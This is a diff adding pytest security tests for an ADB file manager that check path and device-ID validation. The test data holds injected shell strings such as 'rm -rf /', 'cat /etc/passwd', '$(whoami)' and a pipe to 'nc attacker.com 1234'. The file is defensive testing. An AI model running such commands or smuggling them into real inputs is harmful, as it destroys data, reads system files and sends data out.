@@ -401,3 +401,155 @@ class TestADBManager:
         
         assert removed_count == 0
         assert duplicates == []
+
+
+class TestADBManagerSecurityIntegration:
+    """Integration tests for security validation in ADB manager methods."""
+
+    def test_list_files_rejects_command_injection(self):
+        """Test that list_files() rejects paths with command injection attempts."""
+        manager = ADBManager()
+        manager.selected_device = "test_device"
+
+        malicious_paths = [
+            "/sdcard/test; rm -rf /",
+            "/sdcard/$(whoami)",
+            "/sdcard/`malicious`",
+            "/sdcard/test && cat /etc/passwd",
+            "/sdcard/test | nc attacker.com 1234",
+        ]
+
+        for path in malicious_paths:
+            result = manager.list_files(path)
+            assert result == [], f"Failed to reject malicious path: {path}"
+
+    def test_delete_file_rejects_path_traversal(self):
+        """Test that delete_file() rejects path traversal attempts."""
+        manager = ADBManager()
+        manager.selected_device = "test_device"
+
+        malicious_paths = [
+            "/sdcard/test\x00.txt",
+            "/sdcard/file; rm -rf /",
+        ]
+
+        for path in malicious_paths:
+            success, message = manager.delete_file(path)
+            assert not success, f"Failed to reject malicious path: {path}"
+            assert "Invalid path" in message, f"Expected security error message for: {path}"
+
+    def test_create_folder_rejects_malicious_input(self):
+        """Test that create_folder() rejects malicious path inputs."""
+        manager = ADBManager()
+        manager.selected_device = "test_device"
+
+        malicious_paths = [
+            "/sdcard/test && malicious",
+            "/sdcard/$(whoami)",
+            "/sdcard/test\nmalicious_command",
+        ]
+
+        for path in malicious_paths:
+            success, message = manager.create_folder(path)
+            assert not success, f"Failed to reject malicious path: {path}"
+            assert "Invalid path" in message
+
+    def test_move_item_rejects_both_malicious_paths(self):
+        """Test that move_item() rejects malicious source or destination paths."""
+        manager = ADBManager()
+        manager.selected_device = "test_device"
+
+        # Malicious source
+        success, message = manager.move_item("/sdcard/test; rm -rf /", "/sdcard/dest")
+        assert not success
+        assert "Invalid path" in message
+
+        # Malicious destination
+        success, message = manager.move_item("/sdcard/source", "/sdcard/dest && malicious")
+        assert not success
+        assert "Invalid path" in message
+
+    def test_operations_reject_malicious_device_ids(self):
+        """Test that operations reject malicious device IDs."""
+        manager = ADBManager()
+
+        malicious_device_ids = [
+            "device123; malicious",
+            "device && cat /etc/passwd",
+            "device|nc attacker.com",
+            "device\nmalicious",
+        ]
+
+        for device_id in malicious_device_ids:
+            # Test with list_files
+            result = manager.list_files("/sdcard/test", device_id=device_id)
+            assert result == [], f"Failed to reject malicious device ID: {device_id}"
+
+            # Test with get_file_info
+            result = manager.get_file_info("/sdcard/test", device_id=device_id)
+            assert result is None, f"Failed to reject malicious device ID: {device_id}"
+
+    def test_delete_folder_rejects_dangerous_patterns(self):
+        """Test that delete_folder() rejects dangerous path patterns."""
+        manager = ADBManager()
+        manager.selected_device = "test_device"
+
+        dangerous_paths = [
+            "/sdcard/test||malicious",
+            "/sdcard/test&&malicious",
+            "/sdcard/test>>output.txt",
+        ]
+
+        for path in dangerous_paths:
+            success, message = manager.delete_folder(path)
+            assert not success, f"Failed to reject dangerous path: {path}"
+            assert "Invalid path" in message
+
+    def test_get_file_info_with_null_bytes(self):
+        """Test that get_file_info() rejects null bytes in paths."""
+        manager = ADBManager()
+        manager.selected_device = "test_device"
+
+        result = manager.get_file_info("/sdcard/file\x00.txt")
+        assert result is None
+
+    @patch('src.core.adb_manager.ADBCommandRunner')
+    def test_sanitized_paths_passed_to_adb_commands(self, mock_runner_class):
+        """Test that sanitized paths are passed to ADB commands, not original inputs."""
+        mock_runner = MagicMock()
+        mock_runner.run_adb_command.return_value = ("", "", 0)
+        mock_runner_class.return_value = mock_runner
+
+        manager = ADBManager()
+        manager.selected_device = "test_device"
+
+        # Valid path should be passed through
+        manager.list_files("/sdcard/DCIM")
+
+        # Verify the command was called with the sanitized path
+        args_list = mock_runner.run_adb_command.call_args[0][0]
+        assert "/sdcard/DCIM" in args_list
+
+        # Malicious path should not reach the command runner
+        mock_runner.run_adb_command.reset_mock()
+        manager.list_files("/sdcard/test; rm -rf /")
+
+        # Command runner should not be called for invalid paths
+        mock_runner.run_adb_command.assert_not_called()
+
+    def test_unicode_paths_accepted(self):
+        """Test that valid Unicode paths are accepted."""
+        manager = ADBManager()
+        manager.selected_device = "test_device"
+
+        unicode_paths = [
+            "/sdcard/照片/vacation.jpg",
+            "/sdcard/Фото/image.png",
+            "/sdcard/My Photos/vacation.jpg",
+        ]
+
+        for path in unicode_paths:
+            # Should not raise exception or return security error
+            result = manager.list_files(path)
+            # Result will be empty list due to mocked command, but should not reject path
+            assert isinstance(result, list)
